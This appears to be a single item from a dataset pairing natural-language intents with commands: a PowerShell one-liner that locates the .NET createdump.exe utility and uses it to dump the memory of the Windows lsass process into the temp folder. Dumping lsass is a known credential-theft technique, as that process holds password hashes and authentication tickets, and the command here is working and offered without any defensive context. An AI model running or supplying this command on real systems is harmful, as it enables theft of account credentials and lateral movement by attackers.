# Natural language intent:
# Resolve the path for createdump.exe and create a dump of lsass process with specified options.

$exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe" ; & "$exePath" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id
